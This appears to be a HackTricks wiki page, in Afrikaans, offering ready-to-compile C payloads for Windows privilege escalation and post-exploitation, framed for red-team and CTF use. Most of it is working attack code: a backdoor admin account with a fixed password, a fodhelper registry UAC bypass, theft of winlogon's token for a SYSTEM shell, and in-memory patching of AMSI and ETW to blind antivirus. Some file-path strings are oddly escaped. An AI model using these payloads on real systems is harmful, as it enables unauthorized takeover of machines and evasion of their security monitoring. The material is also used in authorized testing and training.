# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy versamel **klein, selfstandige C-snippets** wat handig is tydens Windows Local Privilege Escalation of post-exploitation. Elke payload is ontwerp om maklik te kopieer en te plak, benodig slegs die Windows API / C runtime, en kan gecompileer word met `i686-w64-mingw32-gcc` (x86) of `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Hierdie payloads gaan daarvan uit dat die proses reeds die minimum voorregte het wat nodig is om die aksie uit te voer (bv. `SeDebugPrivilege`, `SeImpersonatePrivilege`, of medium-integrity konteks vir 'n UAC bypass). Dit is bedoel vir **red-team of CTF omgewings** waar die uitbuiting van 'n kwesbaarheid gelei het tot arbitrêre inheemse kode-uitvoering.

---

## Voeg plaaslike administrateur gebruiker by
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Wanneer die vertroude binêre **`fodhelper.exe`** uitgevoer word, doen dit navraag na die registerpad hieronder **sonder om die `DelegateExecute` verb te filtreer**. Deur ons opdrag onder daardie sleutel te plant, kan 'n aanvaller UAC bypass *sonder* om 'n lêer op die skyf te skryf.

*Registerpad wat deur `fodhelper.exe` bevraag word*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
'n minimale PoC wat 'n verhoogde `cmd.exe` oopmaak:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Getoets op Windows 10 22H2 en Windows 11 23H2 (Julie 2025-opdaterings). Die omseiling werk steeds omdat Microsoft nog nie die ontbrekende integriteitskontrole in die `DelegateExecute`-pad reggestel het nie.*

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
As die huidige proses albei `SeDebug` en `SeImpersonate` privileges het (tipies vir baie service-rekeninge), kan jy die token van `winlogon.exe` steel, dit dupliseer, en 'n verhoogde proses begin:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Vir 'n dieper verduideliking van hoe dit werk sien:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Die meeste moderne AV/EDR-enjins vertrou op **AMSI** en **ETW** om kwaadaardige gedrag te ondersoek. Om albei koppelvlakke vroeg binne die huidige proses te patch verhoed dat skripgebaseerde payloads (bv. PowerShell, JScript) gescan word.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Die patch hierbo is proses-lokaal; die opstart van 'n nuwe PowerShell nadat dit uitgevoer is, sal sonder AMSI/ETW-inspeksie plaasvind.*

---

## Skep kindproses as Protected Process Light (PPL)
Versoek 'n PPL-beskermingsvlak vir 'n kindproses tydens skepping deur gebruik te maak van `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Dit is 'n gedokumenteerde API en sal slegs slaag as die teikenbeeld vir die versoekte signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb) onderteken is.
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Vlakke wat die meeste gebruik word:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Valideer die resultaat met Process Explorer/Process Hacker deur die Protection-kolom te kontroleer.

---

## Verwysings
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute

{{#include ../../banners/hacktricks-training.md}}
